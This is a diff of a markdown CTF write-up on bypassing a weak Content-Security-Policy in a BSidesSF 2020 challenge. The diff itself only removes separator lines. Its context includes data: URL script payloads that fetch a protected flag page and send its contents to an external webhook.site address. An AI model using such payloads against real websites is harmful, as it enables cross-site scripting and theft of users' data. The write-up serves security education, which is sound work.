@@ -6,8 +6,6 @@ This challenge from the **BSidesSF 2020 CTF** is focused on **bypassing a Conten
 
 The primary learning goal is understanding how improper CSP configurations can still leave applications vulnerable to client-side attacks, even if inline scripts are blocked.
 
----
-
 ## Challenge Description
 
 We are presented with a web application that loads a page with the following CSP:
@@ -17,8 +15,6 @@ Content-Security-Policy: connect-src '*'; script-src 'self' data:
 ```
 
 A hidden flag is located at the path `/csp-one-flag`, but direct access is prevented unless you can execute JavaScript in the context of the page.
-
----
 
 ## CSP Policy Analysis
 
@@ -38,16 +34,12 @@ The combination of these two directives creates a security vulnerability:
 2. **Wildcard `connect-src`**: This allows exfiltration of data to any external domain
 3. **Missing `object-src` restrictions**: Could allow additional attack vectors
 
----
-
 ## Objective
 
 Bypass the CSP to:
 
 1. Retrieve the contents of `/csp-one-flag` using JavaScript
 2. Exfiltrate that content to an external service for analysis
-
----
 
 ## Technical Analysis
 
@@ -67,8 +59,6 @@ Since inline scripts are blocked but `script-src` allows `data:` URLs, we can in
 2. **`fetch('/csp-one-flag')`**: Retrieves the flag from the protected endpoint
 3. **`.then(r=>r.text())`**: Converts the response to text
 4. **`.then(data=>fetch(...))`**: Exfiltrates the data via POST request
-
----
 
 ## Step-by-Step Exploitation
 
@@ -90,8 +80,6 @@ fetch('/csp-one-flag').then(r=>r.text()).then(data=>fetch('https://webhook.site/
 ### 4. Monitor Webhook
 Check your webhook endpoint for the exfiltrated flag data.
 
----
-
 ## Alternative Techniques
 
 ### Using `eval()` with Data URLs
@@ -103,8 +91,6 @@ Check your webhook endpoint for the exfiltrated flag data.
 ```html
 <script src="data:text/javascript,fetch('/csp-one-flag').then(r=>r.text()).then(data=>{new Image().src='https://webhook.site/YOUR-ID?flag='+encodeURIComponent(data)})"></script>
 ```
-
----
 
 ## Tools and Resources
 
